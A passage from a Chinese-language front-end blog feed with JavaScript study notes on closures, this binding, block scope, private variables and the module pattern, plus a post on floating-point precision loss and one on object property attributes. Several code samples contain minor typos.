compareNames(&#123;name:&quot;Nicholas&quot;&#125;,&#123;name:&quot;Greg&quot;&#125;);  //调用函数</span><br><span class="line">compareNames = null;  //解除对匿名函数的引用</span><br></pre></td></tr></table></figure></p><p><img src="../assets/20190527/pic1.png" alt="Alt text"></p><h3 id="闭包与变量"><a href="#闭包与变量" class="headerlink" title="闭包与变量"></a>闭包与变量</h3><p>闭包只能取得包含函数中任何变量的最后一个值，因为闭包保存的是整个变量对象，而不是某个特殊变量。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">function createFunctions()&#123;</span><br><span class="line">    var result = new Array();</span><br><span class="line">    for(var i = 0; i &lt; 10; i++)&#123;</span><br><span class="line">        result[i] = function() &#123;</span><br><span class="line">            return i;   //每次返回都为10</span><br><span class="line">        &#125;;</span><br><span class="line">    &#125;</span><br><span class="line">    return result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>以上代码，通过匿名函数强制让闭包行为符合预期。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">function createFunctions()&#123;</span><br><span class="line">    var result = new Array();</span><br><span class="line">    for(var i = 0; i &lt; 10; i++)&#123;</span><br><span class="line">        result[i] = function(num) &#123;   //使用匿名函数，则立即执行匿名函数</span><br><span class="line">            return function(num)&#123;</span><br><span class="line">                return num;</span><br><span class="line">            &#125;;   </span><br><span class="line">        &#125;(i);   //值传递，把i赋值给num</span><br><span class="line">    &#125;</span><br><span class="line">    return result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h3 id="this对象"><a href="#this对象" class="headerlink" title="this对象"></a>this对象</h3><p>匿名函数的执行环节具有全局性，因此其this对象通常指向window。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">var name = &quot;The window&quot;;</span><br><span class="line">var object = &#123;</span><br><span class="line">    name : &quot;MyObject&quot;,</span><br><span class="line">    getNameFunc ： function()&#123;</span><br><span class="line">        return function()&#123;</span><br><span class="line">            return this.name;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line">alert(object.getNameFunc()());   //&quot;The window&quot;</span><br></pre></td></tr></table></figure></p><p>每个函数在调用时都会自动取得两个特殊变量<code>this</code>和<code>arguments</code>内部函数只会搜索到其活动对象为止，所以不能直接访问外部函数中的这两个变量。</p><p>可以通过把外部作用域中的this对象保存在闭包能访问到的变量里，让闭包访问。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">var name = &quot;The window&quot;;</span><br><span class="line">var object = &#123;</span><br><span class="line">    name : &quot;MyObject&quot;;</span><br><span class="line">    getNameFunc : function()&#123;</span><br><span class="line">        var that = this;</span><br><span class="line">        return function()&#123;</span><br><span class="line">            return that.name;</span><br><span class="line">        &#125;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line">alert(object.getNameFunc()());  //&quot;MyObject&quot;</span><br></pre></td></tr></table></figure></p><p>特殊情况，this值可能会意外地改变。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">var name = &quot;The window&quot;;</span><br><span class="line">var object = &#123;</span><br><span class="line">    name : &quot;MyObject&quot;;</span><br><span class="line">    getName : function()&#123;</span><br><span class="line">        treturn this.name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line">object.getName();   //&quot;MyObject&quot;</span><br><span class="line">(object.getName)();   //&quot;MyObject&quot;,相当于引用了一个函数，this得到了维持</span><br><span class="line">(object.getName = object.getName)();   //&quot;The window&quot;，this值不能得到维持</span><br></pre></td></tr></table></figure></p><h3 id="内存泄漏"><a href="#内存泄漏" class="headerlink" title="内存泄漏"></a>内存泄漏</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">//该闭包导致element的引用数无法减少，element不会被回收</span><br><span class="line">function assignHandler()&#123;</span><br><span class="line">    var element = document.getElementById(&quot;someElement&quot;);</span><br><span class="line">    element.onlick = function()&#123;</span><br><span class="line">        alert(element.id);    </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="模仿块级作用域"><a href="#模仿块级作用域" class="headerlink" title="模仿块级作用域"></a>模仿块级作用域</h3><p>JavaScript没有块级作用域的概念<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">fucntion outputNumbers(count)&#123;</span><br><span class="line">    for(var i = 0; i &lt; count; i++)&#123;</span><br><span class="line">        alert(i);</span><br><span class="line">    &#125;</span><br><span class="line">    var i;    //重新声明变量也不会改变它的值</span><br><span class="line">    alert(i);  //count值，从i定义开始，就可以在函数内部随处访问</span><br><span class="line">    //而在Java，c++中，变量i只会在for循环的语句块中有定义</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>可以用匿名函数来模仿块级作用域<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">(function()&#123;</span><br><span class="line">    //这里是块级作用域</span><br><span class="line">&#125;)();   //定义并立即调用了一个匿名函数，括号表示它实际上是一个函数表达式</span><br><span class="line">var someFunction = function()&#123;</span><br><span class="line">    //这里是块级作用域</span><br><span class="line">&#125;;</span><br><span class="line">someFunction();</span><br></pre></td></tr></table></figure></p><p>JavaScript将function当作一个函数声明的开始，而函数声明后面不能跟圆括号，而函数表达式可以。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">function outputNumber(count)&#123;</span><br><span class="line">    (function()&#123;</span><br><span class="line">        for(var i = 0; i &lt; count; i++)&#123;</span><br><span class="line">            alert(i);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)();</span><br><span class="line">    alert(i);   //出错</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>私有作用域的i在执行结束后被销毁，私有作用域能访问count，因为其为闭包</p><h3 id="私有变量"><a href="#私有变量" class="headerlink" title="私有变量"></a>私有变量</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">function MyObject()&#123;</span><br><span class="line">    //私有变量和私有函数</span><br><span class="line">    var privateVariable = 10;</span><br><span class="line">    function privateFunction()&#123;</span><br><span class="line">        return false;</span><br><span class="line">    &#125;</span><br><span class="line">    //特权方法</span><br><span class="line">    this.publicMethod = function()&#123;</span><br><span class="line">        privateVariable ++;</span><br><span class="line">        return privateFunction();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>利用私有和特权成员，可以隐藏那些不应该被直接修改的数据<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">funcion Person(name)&#123;</span><br><span class="line">    this.getName = function()&#123;</span><br><span class="line">        return name;</span><br><span class="line">    &#125;;</span><br><span class="line">    this.setName = funcion(value)&#123;</span><br><span class="line">        name = value;</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;</span><br><span class="line">var person = new Person(&quot;Nicholas&quot;);</span><br><span class="line">alert(person.getName());   //&quot;Nicholas&quot;</span><br><span class="line">person.setName(&quot;Greg&quot;);</span><br><span class="line">alert(person.getName());  //&quot;Greg&quot;</span><br></pre></td></tr></table></figure></p><p>在构造函数外部没有办法访问name</p><h3 id="静态私有变量"><a href="#静态私有变量" class="headerlink" title="静态私有变量"></a>静态私有变量</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">(function()&#123;</span><br><span class="line">    //私有变量和私有函数</span><br><span class="line">    var privateVar = 10;</span><br><span class="line">    function privateFunc()&#123;</span><br><span class="line">        return false;</span><br><span class="line">    &#125;</span><br><span class="line">    //构造函数</span><br><span class="line">    MyObject = function()&#123;</span><br><span class="line">    &#125;;   //没有使用var，所以声明的是全局的类</span><br><span class="line">    //公有/特权方法</span><br><span class="line">    MyObject.prototype.publicMethod = function()&#123;</span><br><span class="line">        privateVar ++;</span><br><span class="line">        return privateFunc();</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;)();</span><br></pre></td></tr></table></figure><p>该模式与构造函数定义区别在于，其私有变量和函数是由实例共享的<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">(function()&#123;</span><br><span class="line">    var name = &quot;&quot;;</span><br><span class="line">    Person = function(value)&#123;</span><br><span class="line">        name = value;</span><br><span class="line">    &#125;;</span><br><span class="line">    Person.prototype.getName = function()&#123;</span><br><span class="line">        return name;</span><br><span class="line">    &#125;;</span><br><span class="line">    Person.prototype.setName = function(value)&#123;</span><br><span class="line">        name = value;</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;)();</span><br><span class="line">var person2 = new Person(&quot;Van&quot;);</span><br><span class="line">alert(person1.getName());  //&quot;Van&quot;</span><br><span class="line">person1.setName(&quot;Greg&quot;);</span><br><span class="line">alert(person1.getName());  //&quot;Greg&quot;</span><br><span class="line">var person2 = new Person(&quot;John&quot;);</span><br><span class="line">alert(person1.getName());  //&quot;John&quot;</span><br><span class="line">alert(person2.getName());  //&quot;John&quot;</span><br><span class="line">//name为共享属性</span><br></pre></td></tr></table></figure></p><h3 id="模块模式"><a href="#模块模式" class="headerlink" title="模块模式"></a>模块模式</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">var singleton = function()&#123;</span><br><span class="line">    var privateVar = 10;</span><br><span class="line">    function privateFun()&#123;</span><br><span class="line">        return false;</span><br><span class="line">    &#125;</span><br><span class="line">    //特权/公有方法和属性</span><br><span class="line">    return&#123;</span><br><span class="line">        publicProperty : true,</span><br><span class="line">        publicMethod ：function()&#123;</span><br><span class="line">            privateVar++;</span><br><span class="line">            return privateFunc();</span><br><span class="line">        &#125;  //对象字面量是单例的公共接口</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;();</span><br></pre></td></tr></table></figure><h3 id="增强的模块模式"><a href="#增强的模块模式" class="headerlink" title="增强的模块模式"></a>增强的模块模式</h3><p>增强模块模式适合那些单例必须是某种类型的实例，同时还必须增加某些属性和方法对其加以增强的情况。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">var singleton = function()&#123;</span><br><span class="line">    var privateVar = 10;</span><br><span class="line">    function privateFun()&#123;</span><br><span class="line">        return false;</span><br><span class="line">    &#125;</span><br><span class="line">    var object = new CustomType();</span><br><span class="line">    object.publicProperty = true;</span><br><span class="line">    object.publicMethod = function()&#123;</span><br><span class="line">        privateVar++;</span><br><span class="line">        return privateFun();</span><br><span class="line">    &#125;;</span><br><span class="line">    return object;</span><br><span class="line">&#125;();</span><br></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;基础&quot;&gt;&lt;a href=&quot;#基础&quot; class=&quot;headerlink&quot; title=&quot;基础&quot;&gt;&lt;/a&gt;基础&lt;/h2&gt;&lt;h3 id=&quot;函数声明和函数表达式&quot;&gt;&lt;a href=&quot;#函数声明和函数表达式&quot; class=&quot;headerlink&quot; title=&quot;函数声明和函数表达式&quot;&gt;&lt;/a&gt;函数声明和函数表达式&lt;/h3&gt;&lt;p&gt;函数声明：重要特征是函数声明提升，在执行代码之前会先读取函数声明。&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;sayHi();&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;function sayHi()&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    alert(&amp;quot;Hi&amp;quot;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="前端" scheme="http://dangoying.ink/categories/%E5%89%8D%E7%AB%AF/"/>
    
    
      <category term="前端" scheme="http://dangoying.ink/tags/%E5%89%8D%E7%AB%AF/"/>
    
  </entry>
  
  <entry>
    <title>JS精度丢失问题</title>
    <link href="http://dangoying.ink/JS%E7%B2%BE%E5%BA%A6%E4%B8%A2%E5%A4%B1%E9%97%AE%E9%A2%98.html"/>
    <id>http://dangoying.ink/JS精度丢失问题.html</id>
    <published>2019-03-28T14:56:27.000Z</published>
    <updated>2019-04-01T15:02:19.886Z</updated>
    
    <content type="html"><![CDATA[<p>最近开发的项目新需求中，需要一个金额的输入框，其输入上限为16位整数带两位小数的浮点类型，由于前台显示的金额是字符串型，在传递给后台时使用了<code>parseFloat()</code>方法，却发现在测试校验最大临界值时，发生了四舍五入，最终导致校验失败，由此引发了我对JS浮点数表示和运算了深入理解。</p><a id="more"></a><h2 id="JS浮点数精度丢失的原因"><a href="#JS浮点数精度丢失的原因" class="headerlink" title="JS浮点数精度丢失的原因"></a>JS浮点数精度丢失的原因</h2><p>由于计算机的二进制实现和位数限制，有些数无法有限表示。就像一些无理数不能有限表示，如 圆周率 3.1415926…，1.3333… 等。JS 遵循 IEEE 754 规范，采用双精度存储（double precision），占用 64 bit。</p><p><img src="../assets/20190330/1.jpg" alt="Alt text"></p><ul><li>1位用来表示符号位</li><li>11位用来表示指数</li><li>52位表示尾数</li></ul><p>因为在计算机最底层，数值的运算和操作都是采用二进制实现的，所以计算机没有办法精确表示浮点数，而只能用二进制近似相等的去表示浮点数的小数部分。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0.1 &gt;&gt; 0.0001 1001 1001 1001…（1001无限循环）</span><br><span class="line">0.2 &gt;&gt; 0.0011 0011 0011 0011…（0011无限循环）</span><br></pre></td></tr></table></figure><p>当进行计算或其他操作时时，四舍五入（逢1进，逢0舍）将会导致最终的运算结果存在偏差。</p><p>而大整数也存在同样的问题，因为表示尾数的尾数只有52位，因此 JS 中能精准表示的最大整数是 Math.pow(2, 53)，即十进制9007199254740992。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">9007199254740992     &gt;&gt; 10000000000000...000 // 共计 53 个 0</span><br><span class="line">9007199254740992 + 1 &gt;&gt; 10000000000000...001 // 中间 52 个 0</span><br><span class="line">9007199254740992 + 2 &gt;&gt; 10000000000000...010 // 中间 51 个 0</span><br><span class="line">9007199254740992 + 1 // 丢失        //9007199254740992 </span><br><span class="line">9007199254740992 + 2 // 未丢失      //9007199254740994   </span><br><span class="line">9007199254740992 + 3 // 丢失        //9007199254740992 </span><br><span class="line">9007199254740992 + 4 // 未丢失      //9007199254740996</span><br></pre></td></tr></table></figure><p>由此可知，十进制中的有穷数值，在计算机底层，可能是0、1循环的无限数值。</p><p>在Java、C、C++中，均有对浮点数值的特殊处理，如Java的BigDecimal类型就是用来解决这一浮点数问题。</p><h2 id="常见的出错场合"><a href="#常见的出错场合" class="headerlink" title="常见的出错场合"></a>常见的出错场合</h2><h3 id="浮点数计算、比较："><a href="#浮点数计算、比较：" class="headerlink" title="浮点数计算、比较："></a>浮点数计算、比较：</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0.1 + 0.2 != 0.3 // true</span><br></pre></td></tr></table></figure><h3 id="大整数计算、比较："><a href="#大整数计算、比较：" class="headerlink" title="大整数计算、比较："></a>大整数计算、比较：</h3><p>普通的整数计算比较不太容易出错，除非计算范围超出 Math.pow(2, 53)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">9999999999999999 == 10000000000000001 // true</span><br></pre></td></tr></table></figure><h3 id="多位数字符数值转换："><a href="#多位数字符数值转换：" class="headerlink" title="多位数字符数值转换："></a>多位数字符数值转换：</h3><p>这种情况在一些金额的计算中较容易出现，但也是最容易被忽视的一种，当用户在输入框中输入一个位数较多的字符串（不仅仅包含大数值，小数点后位数过长也包含在这一案例中），并在前台使用JS将其转换为数值，得到的结果往往是四舍五入带有偏差的值</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">parseFloat(0.9);    //0.9</span><br><span class="line">parseFloat(9999999999999999.9)    //10000000000000000</span><br><span class="line">parseInt(&quot;9999999999999999&quot;);    //10000000000000000</span><br><span class="line">parseFloat(9.999999999999999);   //10</span><br></pre></td></tr></table></figure><h3 id="toFixed不会四舍五入："><a href="#toFixed不会四舍五入：" class="headerlink" title="toFixed不会四舍五入："></a>toFixed不会四舍五入：</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">var num = 1.335;</span><br><span class="line">num.toFixed(2);   //1.33</span><br></pre></td></tr></table></figure><h2 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h2><h3 id="浮点数计算、比较：-1"><a href="#浮点数计算、比较：-1" class="headerlink" title="浮点数计算、比较："></a>浮点数计算、比较：</h3><p>通常解决这一问题，采用的都是将浮点部分转换成整数后进行计算</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">//浮点数转换为整数</span><br><span class="line">function toInt(num)&#123;</span><br><span class="line">    var rel = &#123;&#125;;</span><br><span class="line">    var str,pos,len,times;</span><br><span class="line">    str = (num &lt; 0) ? -num + &apos;&apos; : num + &apos;&apos;; </span><br><span class="line">    pos = str.indexOf(&apos;.&apos;);</span><br><span class="line">    len = str.substr(pos+1).length;</span><br><span class="line">    times = Math.pow(10, len);</span><br><span class="line">    rel.times = times;</span><br><span class="line">    rel.num =  num;</span><br><span class="line">    return rel;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//计算过程</span><br><span class="line">function operate(a,b,op)&#123;</span><br><span class="line">    var d1 = toInt(a);</span><br><span class="line">    var d2 = toInt(b);</span><br><span class="line">    var max = d1.times &gt; d2.times ? d1.times : d2.times;</span><br><span class="line">    var rel;</span><br><span class="line">    switch(op)&#123;</span><br><span class="line">        case &quot;+&quot; :</span><br><span class="line">            rel = (d1.num * max + d2.num * max) / max;</span><br><span class="line">            break;</span><br><span class="line">        case &quot;-&quot; :</span><br><span class="line">            rel = (d1.num * max - d2.num * max) / max;</span><br><span class="line">            break;</span><br><span class="line">        case &quot;*&quot; :</span><br><span class="line">            rel = ((d1.num * max) * (d2.num * max)) / (max * max);</span><br><span class="line">            break;</span><br><span class="line">        case &quot;/&quot; :</span><br><span class="line">            rel = (d1.num * max) / (d2.num * max);</span><br><span class="line">            break;</span><br><span class="line">    &#125;</span><br><span class="line">    return rel;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">var rel = operate(0.3,0.1,&quot;+&quot;);   //0.4</span><br></pre></td></tr></table></figure><h3 id="多位数数值转换："><a href="#多位数数值转换：" class="headerlink" title="多位数数值转换："></a>多位数数值转换：</h3><p>前台不对这类字符串进行数值转换，传到后台后，由后台进行处理</p><h3 id="toFix的修复："><a href="#toFix的修复：" class="headerlink" title="toFix的修复："></a>toFix的修复：</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">function toFixed(num, s) &#123;</span><br><span class="line">    var times = Math.pow(10, s)</span><br><span class="line">    var des = num * times + 0.5</span><br><span class="line">    des = parseInt(des, 10) / times</span><br><span class="line">    return des + &apos;&apos;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;最近开发的项目新需求中，需要一个金额的输入框，其输入上限为16位整数带两位小数的浮点类型，由于前台显示的金额是字符串型，在传递给后台时使用了&lt;code&gt;parseFloat()&lt;/code&gt;方法，却发现在测试校验最大临界值时，发生了四舍五入，最终导致校验失败，由此引发了我对JS浮点数表示和运算了深入理解。&lt;/p&gt;
    
    </summary>
    
      <category term="前端" scheme="http://dangoying.ink/categories/%E5%89%8D%E7%AB%AF/"/>
    
    
      <category term="前端" scheme="http://dangoying.ink/tags/%E5%89%8D%E7%AB%AF/"/>
    
  </entry>
  
  <entry>
    <title>JS面向对象程序设计</title>
    <link href="http://dangoying.ink/JS%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1.html"/>
    <id>http://dangoying.ink/JS面向对象程序设计.html</id>
    <published>2019-03-24T03:41:03.000Z</published>
    <updated>2019-03-25T14:16:30.561Z</updated>
    
    <content type="html"><![CDATA[<h2 id="属性类型"><a href="#属性类型" class="headerlink" title="属性类型"></a>属性类型</h2><h3 id="数据属性"><a href="#数据属性" class="headerlink" title="数据属性"></a>数据属性</h3><table><thead><tr><th style="text-align:left">属性名</th><th style="text-align:left">解释</th></tr></thead><tbody><tr><td style="text-align:left">[[Configurable]]</td><td style="text-align:left">表示能否通过delete删除属性从而重新定义属性，默认为true</td></tr><tr><td style="text-align:left">[[Enumerable]]</td><td style="text-align:left">表示能否通过for-in循环返回属性，默认为true</td></tr><tr><td style="text-align:left">[[Writable]]</td><td style="text-align:left">表示能否修改属性的值，默认为true</td></tr><tr><td style="text-align:left">[[Value]]</td><td style="text-align:left">包含这个属性的数值，默认为undefined</td></tr></tbody></table><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">var person = &#123;&#125;;</span><br><span class="line">Object.defineProperty(person,&quot;name&quot;,&#123;</span><br><span class="line">    writable: false,</span><br><span class="line">    value: &quot;Nicholas&quot;</span><br><span class="line">&#125;);</span><br><span class="line">alert(person.name);  // &quot;Nicholas&quot;</span><br><span class="line">person.name = &quot;Greg&quot;;</span><br><span class="line">alert(person.name);  // &quot;Nicholas&quot;,通过修改属性使之不能被修改</span><br></pre></td></tr></table></figure><a id="more"></a><h3 id="访问器属性"><a href="#访问器属性" class="headerlink" title="访问器属性"></a>访问器属性</h3><table><thead><tr><th style="text-align:left">属性名</th><th style="text-align:left">解释</th></tr></thead><tbody><tr><td style="text-align:left">[[Configurable]]</td><td style="text-align:left">表示能否修改属性的特性，或者能否把属性修改为数据属性，默认为true</td></tr><tr><td style="text-align:left">[[Enumerable]]</td><td style="text-align:left">表示能否通过for-in循环返回属性，默认为true</td></tr><tr><td style="text-align:left">[[Get]]</td><td style="text-align:left">在读取属性时调用的函数，默认为undefined</td></tr><tr><td style="text-align:left">[[Set]]</td><td style="text-align:left">在写入属性时调用的函数，默认为undefined</td></tr></tbody></table><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">var book = &#123;</span><br><span class="line">    _year: 2004,</span><br><span class="line">    edition: 1</span><br><span class="line">&#125;;</span><br><span class="line">Object.defineProperty(book,&quot;year&quot;,&#123;</span><br><span class="line">    get: function()&#123;</span><br><span class="line">        return this._year;</span><br><span class="line">    &#125;</span><br><span class="line">    set: function(newValue)&#123;</span><br><span class="line">        if(newVale &gt; 2004)&#123;</span><br><span class="line">            this._year = newValue;</span><br><span class="line">            this.edition += newValue - 2004;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line">book.year = 2005;</span><br><span class="line">alert(book.edition);  // 2,访问属性只能用Object.defineProperty定义</span><br></pre></td></tr></table></figure><h3 id="定义多个属性"><a href="#定义多个属性" class="headerlink" title="定义多个属性"></a>定义多个属性</h3><p>使用Object.defineProperty方法定义多个属性</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span 